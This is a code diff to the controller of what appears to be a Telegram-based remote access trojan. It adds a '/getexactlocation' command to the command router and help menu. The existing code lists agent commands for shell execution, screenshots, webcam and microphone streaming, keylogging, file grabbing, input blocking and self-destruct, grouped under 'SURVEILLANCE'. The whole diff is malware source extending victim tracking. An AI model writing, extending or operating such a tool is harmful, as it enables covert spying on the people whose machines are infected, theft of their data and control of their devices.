@@ -1,7 +1,5 @@
-# app.py (Controller v2.2_FINAL_FIXES)
-# - ADDED: New commands for Live Chat & Live Mic to the help menu and command router.
-# - ADDED: More robust error handling and logging for the /list command to help with debugging.
-# - RETAINS: The critical fix for the HEARTBEAT_URL environment variable typo.
+# app.py (Controller v2.3_LOCATION_AWARE)
+# - ADDED: The new '/getexactlocation' command to the command router and help menu.
 
 import os
 import re
@@ -121,8 +119,8 @@ async def cmd_list_agents(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             response_text += (
                 f"{is_selected} *ID:* `{esc(agent.get('id', 'N/A'))}`\n"
-                f"   *User:* `{esc(agent.get('user', 'N/A'))}` `({esc(is_admin)})`\n"
-                f"   *Last Seen:* `{esc(time_ago)}`\n\n"
+                f"    *User:* `{esc(agent.get('user', 'N/A'))}` `({esc(is_admin)})`\n"
+                f"    *Last Seen:* `{esc(time_ago)}`\n\n"
             )
         
         if not active_agent_found:
@@ -231,7 +229,8 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/help` \\- Display this help menu\n\n"
         
         "*💻 SYSTEM & INFO*\n"
-        "`/info` \\- Get detailed system information\n"
+        "`/info` \\- Get system info and approximate location\n"
+        "`/getexactlocation` \\- 📍 Get precise location via browser \\(requires user interaction\\)\n"
         "`/exec <command>` \\- Execute a shell command\n\n"
         
         "*👁️ SURVEILLANCE*\n"
@@ -299,7 +298,7 @@ ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
 ptb_app.add_handler(CommandHandler("upload", cmd_upload))
 
 agent_commands = [
-    "info", "exec", "ss", "cam", "startkeylogger", "stopkeylogger", 
+    "info", "exec", "ss", "cam", "getexactlocation", "startkeylogger", "stopkeylogger", 
     "livestream", "stoplivestream", "livecam", "stoplivecam", "livemic", "stoplivemic",
     "grab", "ls", "cd", "download", "pwd",
     "blockkeyboard", "unblockkeyboard", "blockmouse", "unblockmouse",
